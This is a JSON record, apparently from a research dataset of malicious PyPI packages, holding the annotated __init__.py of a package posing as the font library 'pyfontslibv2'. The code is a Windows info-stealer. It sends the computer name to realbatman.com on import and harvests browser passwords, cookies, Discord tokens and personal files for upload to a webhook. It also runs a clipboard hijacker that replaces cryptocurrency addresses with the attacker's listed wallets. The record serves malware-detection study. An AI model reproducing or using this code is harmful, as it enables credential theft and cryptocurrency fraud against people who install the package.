[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/pyfontslibv2-0.1.0-py3-none-any/pyfontslibv2/__init__.py",
    "malicious_code": "import os\nimport requests\nimport httpx\nimport asyncio\nimport json\nimport ntpath\nimport random\nimport re\nimport shutil\nimport sqlite3\nimport subprocess\nimport threading\nimport winreg\nimport zipfile\nimport psutil\nimport base64\nimport ctypes\nimport time\nimport pyperclip\nfrom sqlite3 import connect\nfrom base64 import b64decode\nfrom urllib.request import Request, urlopen\nfrom shutil import copy2\nfrom datetime import datetime, timedelta, timezone\nfrom sys import argv\nfrom tempfile import gettempdir, mkdtemp\nfrom json import loads, dumps\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\nfrom Crypto.Cipher import AES\nfrom PIL import ImageGrab\nfrom win32crypt import CryptUnprotectData\n\n# Install dependencies (suspicious, but not directly malicious)\nos.system(\"pip install requests httpx\")\nos.system(\"pip install httpx pyperclip pyotp winregistry psutil pycryptodome PIL-tools asyncio threaded requests datetime colorama pillow customtkinter pyfiglet tqdm pypiwin32 pywin32\")\n\n# Initial exfiltration on run\nhttpx.post(\"https://realbatman.com/\", json={\n    'embeds': [{\n        \"title\": \"Someone Tried to download\",\n        \"description\": \"PC Username =\" + os.getenv(\"COMPUTERNAME\")\n    }]\n})\n\n# Malicious configuration (webhook, crypto addresses, etc.)\n__config__ = {\n    'yourwebhookurl': \"https://realbatman.com/\",\n    'hide': 'yes',\n    'ping': 'yes',\n    'pingtype': 'everyone',\n    'fake_error':'no',\n    'startup': 'yes',\n    'kill_discord_process': False,\n    'dbugkiller': False,\n    'addresse_crypto_replacer': 'yes',\n    'addresse_btc': 'bc1qmaq4andvksy4xsj0pfjpk532wcagadv8vy0wr5',\n    'addresse_eth': '0xcDa3FA41B744af5A35050605BC0CAcB44fF134aB',\n    'addresse_xchain': 'none',\n    'addresse_pchain': 'none',\n    'addresse_cchain': 'none',\n    'addresse_monero': '44phaq945CMXQFBujAz9dpEX4Y9Sw5KvBf9iVq1k49cQdJEk77rneek1cPXdCxumP9SboX2xxpGZ5YM8aYecxLyP4r7dhZe',\n    'addresse_ada': 'addr1qytkh6faxr0mgx3a2eqn2q2jy2y88nvwmxscggxcaap5m7chd05n6vxlksdr64jpx5q4yg5gw0xcakdpsssd3m6rfhas25qwp6',\n    'addresse_dash': 'XqXv3CxEzYcTfT5Nx6zn7ZZpXHBnTLGJP5',\n    'blprggg': [ ... ]\n}\n\n# Malicious class: Clipboard crypto address stealer\nclass auto_copy_wallet:\n    def __init__(self):\n        self.address_st3aler = __config__[\"addresse_crypto_replacer\"]\n        self.address_btc = __config__[\"addresse_btc\"]\n        self.address_eth = __config__[\"addresse_eth\"]\n        self.address_xchain = __config__[\"addresse_xchain\"]\n        self.address_pchain = __config__[\"addresse_pchain\"]\n        self.address_cchain = __config__[\"addresse_cchain\"]\n        self.address_monero = __config__[\"addresse_monero\"]\n        self.address_ada = __config__[\"addresse_ada\"]\n        self.address_dash = __config__[\"addresse_dash\"]\n    def address_swap(self):\n        try:\n            clipboard_data = pyperclip.paste()\n            if re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboard_data):\n                if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                    if self.address_btc != \"none\":\n                        pyperclip.copy(self.address_btc)\n                        pyperclip.paste()\n            if re.search('^0x[a-fA-F0-9]{40}$', clipboard_data):\n                pyperclip.copy(self.address_eth)\n                pyperclip.paste()\n            if re.search('^([X]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):\n                if self.address_xchain != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_xchain)\n                        pyperclip.paste()\n            if re.search('^([P]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):\n                if self.address_pchain != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_pchain)\n                        pyperclip.paste()\n            if re.search('^([C]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):\n                if self.address_cchain != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_cchain)\n                        pyperclip.paste()\n            if re.search('addr1[a-z0-9]+', clipboard_data):\n                if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                    pyperclip.copy(self.address_ada)\n                    pyperclip.paste()\n            if re.search('/X[1-9A-HJ-NP-Za-km-z]{33}$/g', clipboard_data):\n                if self.address_dash != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_dash)\n                        pyperclip.paste()\n            if re.search('/4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/g', clipboard_data):\n                if self.address_monero != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_monero)\n                        pyperclip.paste()\n        except:\n            data = None\n    def loop_through(self):\n        while True:\n            self.address_swap()\n    def run(self):\n        if self.address_st3aler == \"yes\":\n            self.loop_through()\n\n# Malicious class: Steals browser data, tokens, passwords, cookies, uploads to webhook\n# (bc_initial_func and its methods)\n# ... (full class definition as in the code above)\n# This class is very large, but all its methods are malicious: browser data theft, Discord token theft, exfiltration, persistence, anti-debugging, etc.\n\n# Malicious: Data exfiltration via upload() and grabb_GatherAll()\ndef upload(name, tk=''):\n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n    }\n    if name == \"bc_checking\":\n        data = { ... }\n        LoadUrlib(hook, data=dumps(data).encode(), headers=headers)\n        return\n    path = name\n    files = {'file': open(path, 'rb')}\n    # ...\n    LoadRequests(\"POST\", hook, files=files)\n\ndef grabb_GatherAll():\n    browserPaths = [ ... ]\n    Paths_zipped = [ ... ]\n    for patt in browserPaths:\n        a = threading.Thread(target=getPassw, args=[patt[0], patt[3]])\n        a.start()\n        Threadlist.append(a)\n    thread_bccookies = []\n    for patt in browserPaths:\n        a = threading.Thread(target=getCookie, args=[patt[0], patt[4]])\n        a.start()\n        thread_bccookies.append(a)\n    for thread in thread_bccookies: thread.join()\n    DETECTED = Trust(Cookies)\n    if DETECTED == True: return\n    for patt in browserPaths:\n        threading.Thread(target=ZipThings, args=[patt[0], patt[5], patt[1]]).start()\n    for patt in Paths_zipped:\n        threading.Thread(target=ZipThings, args=[patt[0], patt[2], patt[1]]).start()\n    for thread in Threadlist:\n        thread.join()\n    global upths\n    upths = []\n    for file in [\"bc_allpasswords.txt\", \"bc_allcookies.txt\"]:\n        upload(os.getenv(\"TEMP\") + \"\\\\\" + file)\n\n# Malicious: File search and exfiltration from Desktop/Documents/Downloads\ndef bc_checking():\n    user = temp.split(\"\\AppData\")[0]\n    path2search = [\n        user + \"/Desktop\",\n        user + \"/Downloads\",\n        user + \"/Documents\"\n    ]\n    key_wordsFiles = [ ... ]\n    wikith = []\n    for patt in path2search:\n        bc_checking = threading.Thread(target=bc_create_file, args=[patt, key_wordsFiles]);bc_checking.start()\n        wikith.append(bc_checking)\n    return wikith\n\nglobal keyword, cookiWords, paswWords\nkeyword = [ ... ]\ncookiWords = []\npaswWords = []\n\ngrabb_GatherAll()\nDETECTED = Trust(Cookies)\nif not DETECTED:\n    wikith = bc_checking()\n    for thread in wikith: thread.join()\n    time.sleep(0.2)\n    filetext = \"```diff\\n\"\n    for arg in bc_create_files:\n        if len(arg[2]) != 0:\n            foldpath = arg[1]\n            foldlist = arg[2]\n            filetext +=f\"\\n\"\n            filetext += f\"- {foldpath}\\n\"\n            for ffil in foldlist:\n                a = ffil[0].split(\"/\")\n                fileanme = a[len(a)-1]\n                b = ffil[1]\n                filetext += f\"+ Name: {fileanme}\\n+ Link: {b}\"\n                filetext += \"\\n\"\n    filetext += \"\\n```\"\n    upload(\"bc_checking\", filetext)\n    auto = threading.Thread(target=auto_copy_wallet().run)\n    auto.start()\n"
  }
]